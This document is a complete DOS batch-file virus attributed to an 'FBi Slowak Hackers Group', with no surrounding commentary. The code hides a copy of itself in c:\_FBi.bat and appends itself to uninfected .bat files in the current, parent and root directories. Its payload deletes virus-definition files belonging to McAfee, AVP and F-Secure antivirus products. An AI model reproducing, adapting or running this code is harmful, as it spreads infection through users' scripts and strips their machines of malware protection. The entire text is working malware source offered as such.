@echo off%_FBi%
if '%1=='FBi goto FBi%2
set FBi=%0.bat
if not exist %FBi% set FBi=%0
if '%FBi%==' set FBi=autoexec.bat
if exist c:\_FBi.bat goto FBi_go
if not exist %FBi% goto evol_FBi
find "FBi"<%FBi%>c:\_FBi.bat
attrib c:\_FBi.bat +h
:FBi_go
if '%!FBi%=='-- goto FBi_exit
set !FBi=%!FBi%-
command /e:5000 /c c:\_FBi FBi v . .. \ %path%
:evol_FBi
set FBi=
goto FBi_pay
:FBiv
:: FBi
:: FBi
for %%a in (*.bat ..\*.bat \*.bat) do call c:\_FBi FBi inf %%a
exit FBi
:FBi_inf
find "FBi"<%3>nul
if not errorlevel 1 goto FBi_jump
type %3>FBi$
echo.>>FBi$
type c:\_FBi.bat>>FBi$
move FBi$ %3>nul
set FBi!=%FBi!%-
if %FBi#%==-----exit
:FBi_jump
set FBi!=%FBi!%-
if %FBi!%==---exit
:FBi_pay
echo FBi Slowak Hackers Group visit in www.fbi.sk
echo y| del c:\mcafee\*.dat
echo y| del c:\progra~1\mcafee\*.dat
echo y| del c:\progra~1\mcafee~1\*.dat
echo y| del c:\progra~1\avp\*.avc
echo y| del c:\progra~1\antivi~1\*.avc
echo y| del c:\progra~1\data f~1\f-secu~1\anti-v~1\*.avc
echo y| del c:\progra~1\data f~1\f-secu~1\anti-v~1\*.def
:FBi_exit
